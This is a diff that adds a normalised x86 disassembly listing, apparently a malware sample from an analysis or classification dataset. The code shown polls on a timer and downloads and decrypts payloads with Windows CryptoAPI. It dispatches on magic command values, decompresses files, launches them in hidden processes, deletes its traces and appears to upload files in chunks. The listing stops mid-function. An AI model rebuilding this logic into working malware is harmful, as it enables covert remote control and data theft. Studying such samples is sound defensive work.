@@ -1,0 +1,3338 @@
+sub_401000
+sub esp 0x88
+mov ecx [ esp + 0x8c ]
+push esi
+push edi
+lea eax [ esp + 0x8 ]
+push 0x0
+push eax
+push ecx
+mov [ esp + 0x14 ] 0x88
+call LZOpenFileA
+mov esi eax
+mov eax [ esp + 0x98 ]
+lea edx [ esp + 0x8 ]
+push 0x1001
+push edx
+push eax
+call LZOpenFileA
+mov edi eax
+push edi
+push esi
+call LZCopy
+push esi
+call LZClose
+push edi
+call LZClose
+pop edi
+mov eax 0x1
+pop esi
+add esp 0x88
+retn
+sub_401060
+push ecx
+mov eax [ esp + 0x8 ]
+push ebx
+mov ebx [ fopen@IAT ]
+push esi
+push edi
+push rw-data
+push eax
+xor esi esi
+mov [ esp + 0x14 ] 0x1
+call ebx
+mov edi eax
+add esp 0x8
+test edi edi
+jne r-xdata
+mov ecx [ esp + 0x18 ]
+push ebp
+push rw-data
+push ecx
+call ebx
+mov ebp eax
+xor ebx ebx
+add esp 0x8
+cmp ebp ebx
+jne r-xdata
+pop edi
+pop esi
+pop ebx
+pop ecx
+retn
+push 0x3e8
+call [ malloc@IAT ]
+mov esi eax
+add esp 0x4
+cmp esi ebx
+jne r-xdata
+mov [ esp + 0x10 ] ebx
+jmp r-xdata
+mov ebx [ fread@IAT ]
+push edi
+push 0x3e8
+push 0x1
+push esi
+call ebx
+mov [ esp + 0x28 ] eax
+mov eax [ edi + 0xc ]
+add esp 0x10
+test al 0x20
+jne r-xdata
+mov [ esp + 0x10 ] ebx
+jmp r-xdata
+push edi
+mov edi [ fclose@IAT ]
+call edi
+add esp 0x4
+test eax eax
+je r-xdata
+mov [ esp + 0x10 ] 0x0
+lea edx [ esp + 0x18 ]
+and eax 0x10
+push edx
+push esi
+push 0x0
+push eax
+mov eax [ rw-data ]
+push 0x0
+push eax
+call [ CryptDecrypt@IAT ]
+test eax eax
+je r-xdata
+test ebp ebp
+je r-xdata
+mov [ esp + 0x10 ] 0x0
+mov ecx [ esp + 0x18 ]
+push ebp
+push ecx
+push 0x1
+push esi
+call [ fwrite@IAT ]
+mov al [ ebp + 0xc ]
+add esp 0x10
+test al 0x20
+jne r-xdata
+test esi esi
+pop ebp
+je r-xdata
+push ebp
+call edi
+add esp 0x4
+test eax eax
+je r-xdata
+test [ edi + 0xc ] 0x10
+jne r-xdata
+mov eax [ esp + 0xc ]
+pop edi
+pop esi
+pop ebx
+pop ecx
+retn
+push esi
+call [ free@IAT ]
+add esp 0x4
+mov [ esp + 0x10 ] 0x0
+push edi
+push 0x3e8
+push 0x1
+push esi
+call ebx
+mov [ esp + 0x28 ] eax
+mov eax [ edi + 0xc ]
+add esp 0x10
+test al 0x20
+je r-xdata
+sub_401190
+push ebp
+mov ebp [ esp + 0x10 ]
+push esi
+xor esi esi
+test ebp ebp
+jle r-xdata
+pop esi
+pop ebp
+retn
+push ebx
+mov ebx [ esp + 0x14 ]
+push edi
+mov edi [ esp + 0x14 ]
+cmp al 0x61
+jb r-xdata
+cmp al 0x39
+ja r-xdata
+and eax 0xff
+sub eax 0x37
+cmp al 0x7a
+ja r-xdata
+and eax 0xff
+sub eax 0x30
+jmp r-xdata
+cmp al 0x61
+jb r-xdata
+cmp al 0x39
+ja r-xdata
+and eax 0xff
+sub eax 0x57
+jmp r-xdata
+inc esi
+mov ecx eax
+mov al [ esi + edi ]
+cmp al 0x30
+jb r-xdata
+and eax 0xff
+sub eax 0x37
+cmp al 0x7a
+ja r-xdata
+and eax 0xff
+sub eax 0x30
+jmp r-xdata
+mov al [ esi + edi ]
+cmp al 0x30
+jb r-xdata
+pop edi
+pop ebx
+and eax 0xff
+sub eax 0x57
+jmp r-xdata
+shl cl 0x4
+or cl al
+mov eax esi
+cdq
+sub eax edx
+sar eax 0x1
+inc esi
+cmp esi ebp
+mov [ eax + ebx ] cl
+jl r-xdata
+sub_401230
+push ebx
+push ebp
+mov ebp [ esp + 0x10 ]
+push ebp
+call [ malloc@IAT ]
+mov ebx eax
+add esp 0x4
+test ebx ebx
+jne r-xdata
+mov ecx ebp
+push esi
+mov esi [ esp + 0x10 ]
+mov eax ecx
+push edi
+mov edi ebx
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+and ecx 0x3
+[ edi ] [ esi ]
+mov edx [ rw-data ]
+lea ecx [ esp + 0x18 ]
+push ecx
+push ebx
+push 0x0
+push 0x1
+push 0x0
+push edx
+mov [ esp + 0x30 ] ebp
+call [ CryptDecrypt@IAT ]
+pop edi
+pop esi
+test eax eax
+jne r-xdata
+pop ebp
+pop ebx
+retn
+mov eax [ esp + 0x14 ]
+mov ecx [ esp + 0x18 ]
+mov edx [ esp + 0x10 ]
+pop ebp
+mov [ eax ] ebx
+mov [ ecx ] edx
+mov eax 0x1
+pop ebx
+retn
+pop ebp
+pop ebx
+retn
+sub_4012a0
+push ecx
+push esi
+mov esi [ CryptAcquireContextA@IAT ]
+push 0x0
+push 0x12
+push rw-data
+push 0x0
+push rw-data
+call esi
+test eax eax
+jne r-xdata
+mov ecx [ rw-data ]
+lea eax [ esp + 0x4 ]
+push eax
+push 0x0
+push 0x0
+push 0x8003
+push ecx
+call [ CryptCreateHash@IAT ]
+test eax eax
+jne r-xdata
+call [ GetLastError@IAT ]
+cmp eax 0x80090016
+jne r-xdata
+mov edx [ esp + 0xc ]
+push edi
+mov edi edx
+or ecx 0xffffffff
+xor eax eax
+push 0x0
+[ edi ]
+not ecx
+dec ecx
+push ecx
+push edx
+mov edx [ esp + 0x14 ]
+push edx
+call [ CryptHashData@IAT ]
+test eax eax
+pop edi
+jne r-xdata
+pop esi
+pop ecx
+retn
+xor eax eax
+pop esi
+pop ecx
+retn
+push 0x8
+push 0x12
+push rw-data
+push 0x0
+push rw-data
+call esi
+test eax eax
+jne r-xdata
+mov eax [ esp + 0x4 ]
+mov ecx [ rw-data ]
+push rw-data
+push __dos_header
+push eax
+push 0x6601
+push ecx
+call [ CryptDeriveKey@IAT ]
+test eax eax
+jne r-xdata
+pop esi
+pop ecx
+retn
+pop esi
+pop ecx
+retn
+mov eax [ esp + 0x4 ]
+test eax eax
+je r-xdata
+mov eax 0x1
+pop esi
+pop ecx
+retn
+push eax
+call [ CryptDestroyHash@IAT ]
+sub_401380
+push ecx
+push ebx
+push ebp
+mov ebp [ esp + 0x14 ]
+lea eax [ ebp + 0x10 ]
+push eax
+mov [ esp + 0xc ] eax
+call [ malloc@IAT ]
+mov ebx eax
+add esp 0x4
+test ebx ebx
+jne r-xdata
+mov ecx ebp
+push esi
+mov esi [ esp + 0x14 ]
+mov eax ecx
+push edi
+mov edi ebx
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+lea edx [ esp + 0x1c ]
+and ecx 0x3
+[ edi ] [ esi ]
+mov ecx [ esp + 0x10 ]
+mov eax [ rw-data ]
+push ecx
+push edx
+push ebx
+push 0x0
+push 0x1
+push 0x0
+push eax
+mov [ esp + 0x38 ] ebp
+call [ CryptEncrypt@IAT ]
+pop edi
+pop esi
+test eax eax
+jne r-xdata
+pop ebp
+pop ebx
+pop ecx
+retn
+mov ecx [ esp + 0x18 ]
+mov edx [ esp + 0x1c ]
+mov eax [ esp + 0x14 ]
+pop ebp
+mov [ ecx ] ebx
+mov [ edx ] eax
+mov eax 0x1
+pop ebx
+pop ecx
+retn
+pop ebp
+pop ebx
+pop ecx
+retn
+sub_401400
+push edi
+mov edi [ esp + 0x10 ]
+xor ecx ecx
+test edi edi
+jle r-xdata
+pop edi
+retn
+mov edx [ esp + 0xc ]
+push esi
+mov esi [ esp + 0xc ]
+add al 0x30
+add al 0x37
+jmp r-xdata
+add al 0x30
+add al 0x37
+jmp r-xdata
+mov [ edx ] al
+mov al [ ecx + esi ]
+and eax 0xf
+cmp eax 0x9
+jle r-xdata
+xor eax eax
+mov al [ ecx + esi ]
+shr eax 0x4
+cmp eax 0x9
+jle r-xdata
+pop esi
+mov [ edx + 0x1 ] al
+inc ecx
+add edx 0x2
+cmp ecx edi
+jl r-xdata
+sub_401450
+push ecx
+lea eax [ esp ]
+push eax
+push 0x0
+push 0x0
+push sub_401480
+push 0x0
+push 0x0
+call [ _beginthreadex@IAT ]
+add esp 0x18
+test eax eax
+je r-xdata
+mov eax 0x1
+pop ecx
+retn
+push eax
+call [ CloseHandle@IAT ]
+sub_401480
+sub esp 0x8
+push ebx
+push ebp
+push esi
+push edi
+call sub_402070
+mov ebx [ Sleep@IAT ]
+test eax eax
+jne r-xdata
+mov edi rw-data
+or ecx 0xffffffff
+xor eax eax
+mov ebp 0x927c0
+[ edi ]
+not ecx
+sub edi ecx
+mov eax ecx
+mov esi edi
+mov edi rw-data
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+and ecx 0x3
+[ edi ] [ esi ]
+mov edi [ free@IAT ]
+push 0x2710
+call ebx
+call sub_402070
+test eax eax
+je r-xdata
+mov edx ebp
+mov [ rw-data ] ebp
+push edx
+call ebx
+jmp r-xdata
+mov eax [ esp + 0x10 ]
+mov ecx [ esp + 0x14 ]
+push eax
+push ecx
+call sub_401530
+mov esi eax
+add esp 0x8
+test esi esi
+je r-xdata
+lea ecx [ esp + 0x10 ]
+lea edx [ esp + 0x14 ]
+push ecx
+push edx
+call sub_4015a0
+add esp 0x8
+test eax eax
+je r-xdata
+push esi
+call sub_401780
+push esi
+call edi
+mov edx [ rw-data ]
+add esp 0x8
+push edx
+call ebx
+jmp r-xdata
+sub_401530
+push ecx
+push ebx
+mov ebx [ esp + 0x10 ]
+mov eax ebx
+push esi
+cdq
+sub eax edx
+push edi
+mov edi eax
+sar edi 0x1
+push edi
+call [ malloc@IAT ]
+mov esi eax
+add esp 0x4
+test esi esi
+jne r-xdata
+mov eax [ esp + 0x14 ]
+push ebx
+push esi
+push eax
+call sub_401190
+lea ecx [ esp + 0x18 ]
+lea edx [ esp + 0x24 ]
+push ecx
+push edx
+push edi
+push esi
+call sub_401230
+add esp 0x1c
+test eax eax
+push esi
+jne r-xdata
+pop edi
+pop esi
+pop ebx
+pop ecx
+retn
+call [ free@IAT ]
+mov eax [ esp + 0x1c ]
+add esp 0x4
+pop edi
+pop esi
+pop ebx
+pop ecx
+retn
+call [ free@IAT ]
+add esp 0x4
+xor eax eax
+pop edi
+pop esi
+pop ebx
+pop ecx
+retn
+sub_4015a0
+sub esp 0x108
+push ebx
+push ebp
+push esi
+push edi
+mov ecx 0x40
+xor eax eax
+lea edi [ esp + 0x15 ]
+mov [ esp + 0x14 ] 0x0
+[ edi ]
+stosw [ edi ]
+stosb [ edi ]
+mov eax [ rw-data ]
+test eax eax
+je r-xdata
+pop edi
+pop esi
+pop ebp
+xor eax eax
+pop ebx
+add esp 0x108
+retn
+push 0x0
+push 0x0
+lea ecx [ esp + 0x1c ]
+push 0x104
+push ecx
+push rw-data
+push 0x0
+call eax
+test eax eax
+jne r-xdata
+lea edx [ esp + 0x14 ]
+push rw-data
+push edx
+call [ fopen@IAT ]
+mov ebx eax
+add esp 0x8
+test ebx ebx
+jne r-xdata
+mov edi [ fseek@IAT ]
+push 0x2
+push 0x0
+push ebx
+call edi
+push ebx
+call [ ftell@IAT ]
+push 0x0
+push 0x0
+push ebx
+mov esi eax
+call edi
+lea edi [ esi + 0x1 ]
+push edi
+call [ malloc@IAT ]
+mov ebp eax
+add esp 0x20
+test ebp ebp
+je r-xdata
+lea eax [ esp + 0x14 ]
+push eax
+call [ DeleteFileA@IAT ]
+pop edi
+pop esi
+pop ebp
+xor eax eax
+pop ebx
+add esp 0x108
+retn
+mov ecx edi
+xor eax eax
+mov edx ecx
+mov edi ebp
+shr ecx 0x2
+[ edi ]
+mov ecx edx
+push ebx
+and ecx 0x3
+push esi
+push 0x1
+push ebp
+[ edi ]
+call [ fread@IAT ]
+add esp 0x10
+cmp eax esi
+push ebx
+je r-xdata
+call [ fclose@IAT ]
+add esp 0x4
+lea ecx [ esp + 0x14 ]
+push ecx
+call [ DeleteFileA@IAT ]
+mov esi [ strstr@IAT ]
+push rw-data
+push ebp
+call esi
+mov ebx eax
+add esp 0x8
+test ebx ebx
+mov [ esp + 0x10 ] ebx
+je r-xdata
+call [ fclose@IAT ]
+add esp 0x4
+lea eax [ esp + 0x14 ]
+push eax
+call [ DeleteFileA@IAT ]
+push ebp
+call [ free@IAT ]
+add esp 0x4
+push rw-data
+push ebx
+call esi
+add esp 0x8
+test eax eax
+je r-xdata
+mov edi eax
+or ecx 0xffffffff
+xor eax eax
+[ edi ]
+not ecx
+dec ecx
+mov edi ebx
+mov edx ecx
+or ecx 0xffffffff
+[ edi ]
+not ecx
+dec ecx
+mov edi rw-data
+mov ebx ecx
+or ecx 0xffffffff
+sub ebx edx
+[ edi ]
+not ecx
+dec ecx
+sub ebx ecx
+lea edi [ ebx + 0x1 ]
+push edi
+call [ malloc@IAT ]
+mov ecx edi
+mov edx eax
+mov esi ecx
+xor eax eax
+mov edi edx
+push ebp
+shr ecx 0x2
+[ edi ]
+mov ecx esi
+and ecx 0x3
+[ edi ]
+mov edi rw-data
+or ecx 0xffffffff
+xor eax eax
+[ edi ]
+not ecx
+dec ecx
+mov edi edx
+mov esi ecx
+mov ecx [ esp + 0x18 ]
+add esi ecx
+mov ecx ebx
+mov eax ecx
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+mov eax [ esp + 0x124 ]
+and ecx 0x3
+[ edi ] [ esi ]
+mov ecx [ esp + 0x128 ]
+mov [ ecx ] ebx
+mov [ eax ] edx
+call [ free@IAT ]
+add esp 0x8
+mov eax 0x1
+pop edi
+pop esi
+pop ebp
+pop ebx
+add esp 0x108
+retn
+sub_401780
+mov edx [ esp + 0x4 ]
+mov [ rw-data ] 0x927c0
+mov eax [ edx ]
+cmp eax 0x76200461
+ja r-xdata
+cmp eax 0x87360121
+jne r-xdata
+je r-xdata
+retn
+add edx 0x4
+push edx
+call sub_401a40
+pop ecx
+jmp r-xdata
+cmp eax 0x15420625
+je r-xdata
+retn
+mov eax [ edx + 0x4 ]
+lea eax [ eax + eax * 2 ]
+lea eax [ eax + eax * 4 ]
+lea eax [ eax + eax * 4 ]
+lea eax [ eax + eax * 4 ]
+lea ecx [ eax + eax * 4 ]
+shl ecx 0x5
+mov [ rw-data ] ecx
+retn
+cmp eax 0x43753159
+jne r-xdata
+push esi
+lea esi [ edx + 0x4 ]
+push edi
+mov edi esi
+or ecx 0xffffffff
+xor eax eax
+[ edi ]
+not ecx
+dec ecx
+lea eax [ ecx + edx + 0x5 ]
+push eax
+push esi
+call sub_401810
+add esp 0x8
+pop edi
+pop esi
+retn
+sub_401810
+sub esp 0x360
+push ebx
+push ebp
+push esi
+push edi
+xor ebx ebx
+mov ecx 0x40
+xor eax eax
+lea edi [ esp + 0x169 ]
+mov [ esp + 0x168 ] bl
+mov [ esp + 0x64 ] bl
+[ edi ]
+stosw [ edi ]
+stosb [ edi ]
+mov ecx 0x40
+xor eax eax
+lea edi [ esp + 0x65 ]
+mov [ esp + 0x26c ] bl
+[ edi ]
+stosw [ edi ]
+stosb [ edi ]
+mov ecx 0x40
+xor eax eax
+lea edi [ esp + 0x26d ]
+lea edx [ esp + 0x26c ]
+[ edi ]
+stosw [ edi ]
+stosb [ edi ]
+mov edi rw-data
+or ecx 0xffffffff
+xor eax eax
+push rw-data
+[ edi ]
+not ecx
+sub edi ecx
+mov eax ecx
+mov esi edi
+mov edi edx
+lea edx [ esp + 0x270 ]
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+xor eax eax
+and ecx 0x3
+[ edi ] [ esi ]
+mov edi [ esp + 0x37c ]
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+mov esi edi
+mov ebp ecx
+mov edi edx
+or ecx 0xffffffff
+[ edi ]
+mov ecx ebp
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebp
+and ecx 0x3
+[ edi ] [ esi ]
+call [ LoadLibraryA@IAT ]
+cmp eax ebx
+je r-xdata
+pop edi
+pop esi
+pop ebp
+xor eax eax
+pop ebx
+add esp 0x360
+retn
+push rw-data
+push eax
+call [ GetProcAddress@IAT ]
+cmp eax ebx
+je r-xdata
+mov edx [ esp + 0x374 ]
+push ebx
+push ebx
+lea ecx [ esp + 0x170 ]
+push 0x104
+push ecx
+push edx
+push ebx
+call eax
+test eax eax
+jne r-xdata
+lea edi [ esp + 0x168 ]
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+lea edx [ esp + 0x64 ]
+mov eax ecx
+mov esi edi
+mov edi edx
+lea edx [ esp + 0x64 ]
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+xor eax eax
+and ecx 0x3
+[ edi ] [ esi ]
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+mov esi edi
+mov ebp ecx
+mov edi edx
+or ecx 0xffffffff
+[ edi ]
+mov ecx ebp
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebp
+lea eax [ esp + 0x64 ]
+and ecx 0x3
+push eax
+[ edi ] [ esi ]
+lea ecx [ esp + 0x16c ]
+push ecx
+call sub_401060
+add esp 0x8
+test eax eax
+jne r-xdata
+mov esi [ DeleteFileA@IAT ]
+lea eax [ esp + 0x168 ]
+push eax
+call esi
+lea ecx [ esp + 0x26c ]
+lea edx [ esp + 0x64 ]
+push ecx
+push edx
+call sub_401000
+add esp 0x8
+test eax eax
+jne r-xdata
+lea edx [ esp + 0x168 ]
+push edx
+call [ DeleteFileA@IAT ]
+lea ecx [ esp + 0x64 ]
+push ecx
+call esi
+mov ecx 0x10
+xor eax eax
+lea edi [ esp + 0x24 ]
+mov [ esp + 0x20 ] 0x44
+xor edx edx
+[ edi ]
+lea eax [ esp + 0x10 ]
+mov [ esp + 0x10 ] edx
+lea ecx [ esp + 0x20 ]
+push eax
+mov [ esp + 0x18 ] edx
+push ecx
+push ebx
+mov [ esp + 0x24 ] edx
+push ebx
+push 0x8000000
+mov [ esp + 0x30 ] edx
+push ebx
+push ebx
+lea edx [ esp + 0x288 ]
+push ebx
+push edx
+push ebx
+mov [ esp + 0x74 ] 0x1
+mov [ esp + 0x78 ] bx
+call [ CreateProcessA@IAT ]
+pop edi
+pop esi
+pop ebp
+pop ebx
+add esp 0x360
+retn
+lea eax [ esp + 0x64 ]
+push eax
+call esi
+pop edi
+pop esi
+pop ebp
+xor eax eax
+pop ebx
+add esp 0x360
+retn
+sub_401a40
+sub esp 0x104
+push edi
+mov ecx 0x40
+xor eax eax
+lea edi [ esp + 0x5 ]
+mov [ esp + 0x4 ] 0x4
+[ edi ]
+stosw [ edi ]
+stosb [ edi ]
+call [ GetTickCount@IAT ]
+push eax
+lea eax [ esp + 0x8 ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+mov edx [ esp + 0x118 ]
+lea ecx [ esp + 0x10 ]
+push ecx
+push edx
+call sub_402170
+add esp 0x14
+test eax eax
+pop edi
+je r-xdata
+push 0x0
+call sub_401ac0
+add esp 0x4
+xor eax eax
+add esp 0x104
+retn
+lea eax [ esp ]
+push eax
+call sub_401ac0
+add esp 0x4
+mov eax 0x1
+add esp 0x104
+retn
+sub_401ac0
+sub esp 0x31c
+push ebx
+push ebp
+push esi
+push edi
+mov ecx 0x40
+xor eax eax
+lea edi [ esp + 0x229 ]
+mov [ esp + 0x228 ] 0x0
+[ edi ]
+mov edx [ rw-data ]
+stosw [ edi ]
+test edx edx
+stosb [ edi ]
+jne r-xdata
+mov ecx 0x3f
+xor eax eax
+lea edi [ esp + 0x25 ]
+mov [ esp + 0x24 ] 0x0
+[ edi ]
+stosw [ edi ]
+stosb [ edi ]
+mov eax [ esp + 0x330 ]
+test eax eax
+jne r-xdata
+pop edi
+pop esi
+pop ebp
+xor eax eax
+pop ebx
+add esp 0x31c
+retn
+push rw-data
+push eax
+call [ fopen@IAT ]
+mov esi eax
+add esp 0x8
+test esi esi
+jne r-xdata
+mov ecx 0x40
+lea edi [ esp + 0x24 ]
+[ edi ]
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+lea ebx [ esp + 0x24 ]
+mov eax ecx
+mov esi edi
+mov edi ebx
+lea ebx [ esp + 0x24 ]
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+xor eax eax
+and ecx 0x3
+push eax
+[ edi ] [ esi ]
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+push eax
+mov esi edi
+mov ebp ecx
+mov edi ebx
+or ecx 0xffffffff
+[ edi ]
+mov ecx ebp
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebp
+push 0x104
+and ecx 0x3
+lea eax [ esp + 0x30 ]
+[ edi ] [ esi ]
+lea ecx [ esp + 0x234 ]
+push ecx
+push eax
+push 0x0
+call edx
+pop edi
+pop esi
+pop ebp
+xor eax eax
+pop ebx
+add esp 0x31c
+retn
+mov edi [ fseek@IAT ]
+push 0x2
+push 0x0
+push esi
+call edi
+push esi
+call [ ftell@IAT ]
+push 0x0
+push 0x0
+push esi
+mov ebx eax
+call edi
+lea edi [ ebx + 0x1 ]
+push edi
+call [ malloc@IAT ]
+mov ebp eax
+add esp 0x20
+test ebp ebp
+jne r-xdata
+mov ecx 0x40
+lea edi [ esp + 0x24 ]
+[ edi ]
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+lea edx [ esp + 0x24 ]
+mov eax ecx
+mov esi edi
+mov edi edx
+lea edx [ esp + 0x24 ]
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+xor eax eax
+and ecx 0x3
+push eax
+[ edi ] [ esi ]
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+push eax
+mov esi edi
+mov ebx ecx
+mov edi edx
+or ecx 0xffffffff
+[ edi ]
+mov ecx ebx
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebx
+lea eax [ esp + 0x230 ]
+and ecx 0x3
+push 0x104
+[ edi ] [ esi ]
+lea ecx [ esp + 0x30 ]
+push eax
+push ecx
+push 0x0
+call [ rw-data ]
+pop edi
+pop esi
+pop ebp
+xor eax eax
+pop ebx
+add esp 0x31c
+retn
+mov ecx edi
+xor eax eax
+mov edx ecx
+mov edi ebp
+shr ecx 0x2
+[ edi ]
+mov ecx edx
+push esi
+and ecx 0x3
+push ebx
+push 0x1
+push ebp
+[ edi ]
+call [ fread@IAT ]
+push esi
+call [ fclose@IAT ]
+mov eax [ esp + 0x344 ]
+add esp 0x14
+push eax
+call [ DeleteFileA@IAT ]
+lea ecx [ esp + 0x10 ]
+lea edx [ esp + 0x1c ]
+push ecx
+push edx
+push ebx
+push ebp
+call sub_401380
+add esp 0x10
+test eax eax
+jne r-xdata
+mov ecx 0x40
+lea edi [ esp + 0x24 ]
+[ edi ]
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+lea edx [ esp + 0x24 ]
+mov eax ecx
+mov esi edi
+mov edi edx
+lea edx [ esp + 0x24 ]
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+xor eax eax
+and ecx 0x3
+push eax
+[ edi ] [ esi ]
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+push eax
+mov esi edi
+mov ebx ecx
+mov edi edx
+or ecx 0xffffffff
+[ edi ]
+mov ecx ebx
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebx
+lea eax [ esp + 0x230 ]
+and ecx 0x3
+push 0x104
+[ edi ] [ esi ]
+lea ecx [ esp + 0x30 ]
+push eax
+push ecx
+push ebp
+call [ rw-data ]
+pop edi
+pop esi
+pop ebp
+xor eax eax
+pop ebx
+add esp 0x31c
+retn
+mov edx [ esp + 0x10 ]
+lea ebp [ edx + edx + 0x1 ]
+push ebp
+call [ malloc@IAT ]
+mov ebx eax
+add esp 0x4
+test ebx ebx
+mov [ esp + 0x18 ] ebx
+jne r-xdata
+mov ecx 0x40
+lea edi [ esp + 0x24 ]
+[ edi ]
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+lea edx [ esp + 0x24 ]
+mov eax ecx
+mov esi edi
+mov edi edx
+lea edx [ esp + 0x24 ]
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+xor eax eax
+and ecx 0x3
+push eax
+[ edi ] [ esi ]
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+push eax
+mov esi edi
+mov ebx ecx
+mov edi edx
+or ecx 0xffffffff
+[ edi ]
+mov ecx ebx
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebx
+lea eax [ esp + 0x230 ]
+and ecx 0x3
+push 0x104
+[ edi ] [ esi ]
+lea ecx [ esp + 0x30 ]
+push eax
+push ecx
+push 0x0
+call [ rw-data ]
+pop edi
+pop esi
+pop ebp
+xor eax eax
+pop ebx
+add esp 0x31c
+retn
+mov ecx ebp
+xor eax eax
+mov edx ecx
+mov edi ebx
+shr ecx 0x2
+[ edi ]
+mov ecx edx
+and ecx 0x3
+[ edi ]
+mov eax [ esp + 0x10 ]
+mov ecx [ esp + 0x1c ]
+push eax
+push ebx
+push ecx
+call sub_401400
+add esp 0xc
+mov [ esp + 0x14 ] 0x1
+call [ GetTickCount@IAT ]
+mov esi eax
+mov eax [ esp + 0x10 ]
+cdq
+idiv ebp
+push 0x1
+lea edx [ esp + 0x28 ]
+mov [ esp + 0x24 ] esi
+inc eax
+push eax
+push esi
+push rw-data
+push rw-data
+push edx
+call [ sprintf@IAT ]
+lea edi [ esp + 0x3c ]
+or ecx 0xffffffff
+xor eax eax
+add esp 0x18
+[ edi ]
+not ecx
+dec ecx
+mov ebp 0xfa
+sub ebp ecx
+mov edi ebx
+or ecx 0xffffffff
+mov ebx eax
+[ edi ]
+not ecx
+dec ecx
+lea edi [ esp + 0x125 ]
+mov edx ecx
+mov ecx 0x40
+mov [ esp + 0x124 ] al
+mov [ esp + 0x10 ] edx
+[ edi ]
+stosw [ edi ]
+stosb [ edi ]
+je r-xdata
+mov ecx 0x40
+lea edi [ esp + 0x24 ]
+[ edi ]
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+lea edx [ esp + 0x24 ]
+mov eax ecx
+mov esi edi
+mov edi edx
+lea edx [ esp + 0x24 ]
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+xor eax eax
+and ecx 0x3
+push eax
+[ edi ] [ esi ]
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+push eax
+mov esi edi
+mov ebx ecx
+mov edi edx
+or ecx 0xffffffff
+[ edi ]
+mov ecx ebx
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebx
+lea eax [ esp + 0x230 ]
+and ecx 0x3
+push 0x104
+[ edi ] [ esi ]
+lea ecx [ esp + 0x30 ]
+push eax
+push ecx
+push 0x0
+call [ rw-data ]
+mov edx [ esp + 0x1c ]
+push edx
+call [ free@IAT ]
+add esp 0x4
+xor eax eax
+pop edi
+pop esi
+pop ebp
+pop ebx
+add esp 0x31c
+retn
+pop edi
+pop esi
+pop ebp
+mov eax 0x1
+pop ebx
+add esp 0x31c
+retn
+jmp r-xdata
+mov eax [ esp + 0x14 ]
+lea ecx [ esp + 0x24 ]
+push eax
+mov eax edx
+cdq
+idiv ebp
+inc eax
+push eax
+push esi
+push rw-data
+push rw-data
+push ecx
+call [ sprintf@IAT ]
+mov ecx 0x41
+xor eax eax
+lea edi [ esp + 0x13c ]
+add esp 0x18
+[ edi ]
+lea edi [ esp + 0x24 ]
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+lea edx [ esp + 0x124 ]
+mov eax ecx
+mov esi edi
+mov edi edx
+mov edx [ esp + 0x10 ]
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+sub edx ebx
+and ecx 0x3
+cmp ebp edx
+[ edi ] [ esi ]
+mov ecx [ esp + 0x18 ]
+lea edi [ esp + 0x124 ]
+lea esi [ ecx + ebx ]
+jae r-xdata
+or ecx 0xffffffff
+xor eax eax
+[ edi ]
+not ecx
+dec ecx
+lea edi [ esp + ecx + 0x124 ]
+mov ecx edx
+mov eax ecx
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+xor eax eax
+and ecx 0x3
+[ edi ] [ esi ]
+lea edi [ esp + 0x124 ]
+or ecx 0xffffffff
+[ edi ]
+not ecx
+dec ecx
+add ecx edx
+mov dl [ rw-data ]
+mov [ esp + ecx + 0x124 ] dl
+or ecx 0xffffffff
+xor eax eax
+[ edi ]
+not ecx
+dec ecx
+lea edi [ esp + ecx + 0x124 ]
+mov ecx ebp
+mov edx ecx
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx edx
+and ecx 0x3
+[ edi ] [ esi ]
+lea edi [ esp + 0x124 ]
+or ecx 0xffffffff
+[ edi ]
+mov al [ rw-data ]
+not ecx
+dec ecx
+add ecx ebp
+mov [ esp + ecx + 0x124 ] al
+jmp r-xdata
+mov esi [ esp + 0x20 ]
+mov edx [ esp + 0x14 ]
+push 0x0
+push 0x0
+lea eax [ esp + 0x230 ]
+push 0x104
+lea ecx [ esp + 0x130 ]
+add ebx ebp
+push eax
+inc edx
+push ecx
+push 0x0
+mov [ esp + 0x2c ] edx
+call [ rw-data ]
+mov edx [ esp + 0x10 ]
+cmp ebx edx
+jb r-xdata
+sub_402070
+sub esp 0x20
+mov ecx 0x41
+xor eax eax
